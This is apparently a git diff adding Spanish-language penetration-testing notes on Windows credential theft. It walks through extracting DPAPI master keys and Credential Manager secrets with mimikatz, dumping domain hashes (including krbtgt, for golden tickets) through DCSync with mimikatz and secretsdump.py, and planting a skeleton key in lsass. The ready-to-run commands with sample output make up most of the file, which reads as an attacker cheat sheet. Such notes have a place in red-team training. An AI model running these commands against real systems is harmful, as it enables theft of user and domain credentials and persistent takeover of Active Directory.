@@ -1,0 +1,89 @@
+# CREDENTIAL ACCESS (WINDOWS LOCAL):
+
+## DPAPI:
+Es el "protocolo" usado por microsoft en base a una "mastek key" con la que se puedan descrifrar y cifrar datos por los desarrolladores, por ejemplo los navegadores pueden cifrar las contraseñas en base a DPAPI, un dato importante es que la Master Key puede variar en base a la contraseña del usuario.
+
+### Get Master key:
+Lo más comun es que con mimikatz lo podamos conseguir, la key usualmente esta almacenada en:
+
+- C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+- C:\Users\USER\AppData\Local\Microsoft\Protect
+
+NOTA:
+- Roaming (AppData\Roaming\Protect): Los datos y claves almacenados aquí se pueden sincronizar entre diferentes dispositivos cuando el usuario tiene un perfil móvil, permitiendo que los datos protegidos sean accesibles en cualquier dispositivo del dominio.
+- Local (AppData\Local\Protect): Los datos y claves se limitan al dispositivo donde fueron generados, por lo que solo serán accesibles en esa máquina específica.
+
+Dentro de estas carpetas encontraremos otra carpeta con un SID, donde contiene el fichero con una denominación szGuid.
+
+La primer tarea es justamente encontrar la ruta completa, que debemos usar cmd al ser ficheros ocultos.
+```
+> dir /a:h C:\Users\USER\AppData\Roaming\Microsoft\Protect\<S-1-5-21-3097112084-1706841912-3560390538-1000>\
+> dir /a:h C:\Users\USER\AppData\Roaming\Microsoft\Protect\<S-1-5-21-3097112084-1706841912-3560390538-1000>\
+```
+
+El valor del SID variara entre dispositivos.
+
+Obtenida la ruta completa podemos extraer el master key.
+```
+mimikatz> dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\S-1-5-21-3097112084-1706841912-3560390538-1000\313fbe20-e5fd-2609-33d3-6b085b58e987" /sid:S-1-5-21-3097112084-1706841912-3560390538-1000 /password:contraseñaejemplo /protected
+(...)
+[masterkey] with password: contraseñaejemplo (protected user)
+  key : cc1f3539ee123435cd425b87b3adb9ce5fe043ed7d7d3892a88093879fa348f1e0d0102eff9c19ca32a7f001450e7417353258abf48deeccac78ddc390d28be8
+  sha1: dc1038(...)
+```
+
+Despues ya teniendo la masterkey podemos descrifrar los datos aparte, o con el mismo mimikatz, podemos buscar las credenciales guardadas en el windows "Credential Manager" donde se almacenan por ejemplo las contraseñas de RDP.
+```
+> dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\Credentials\98A34CA2D99C1CEBB9365414C74839F1 
+(...)
+ TargetName     : Domain:target=testin.home
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : prueba
+  CredentialBlob : prueba
+  Attributes     : 0
+> dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\Credentials\98A34CA2D99C1CEBB9365414C74839F1 /masterkey:cc1f3539ee123435cd425b87b3adb9ce5fe043ed7d7d3892a88093879fa348f1e0d0102eff9c19ca32a7f001450e7417353258abf48deeccac78ddc390d28be8
+```
+
+**Considerar que pueden haber multiples masterkey.**
+
+# CREDENTIAL ACCESS (DOMAIN):
+
+## DCSYNC:
+Proceso de replicación nativa de windows, donde se requieren los permisos:
+
+- DS-Replication-Get-Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes In Filtered Set
+
+Ya sea para un usuario, o para un AD que este dentro de un grupo con los permisos asignados.
+
+La explotación puede ser tanto local y remoto.
+
+### Local:
+```
+lsadump::dcsync /user:dcorp\krbtgt <u otro usuario pero en este caso el hash de ntlm de usuario krbtgt es el requerido para emitir golden tickets>
+```
+5porfc
+### Remoto:
+```
+> secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
+```
+
+Aquí un escenario que podria pasar es que por ejemplo logremos conseguir un usuario y contraseña del AD con permisos de replicación del AD, donde en base a este usuario logremos emitir goldentickets del domain admin.
+
+## Key Skeleton attack:
+En resumen el ataque es "sencillo" lo que se hace es modificar mediante una inyección en memoria a lsass (encargado de la autenticación) haciendo que ademas de permitir la autenticación por medio de la contraseña guardada en el AD, tambien permita la autenticación con una "master key" inyectada.
+Esto hace que el atacante pueda autenticarse con la master key usando cualquier usuario, teniendo permanencia hasta que el AD se reinicie o el proceso inyectado sea matado.
+```
+mimikatz> misc::skeleton
+```
+
+
+
+
+
+
+
+
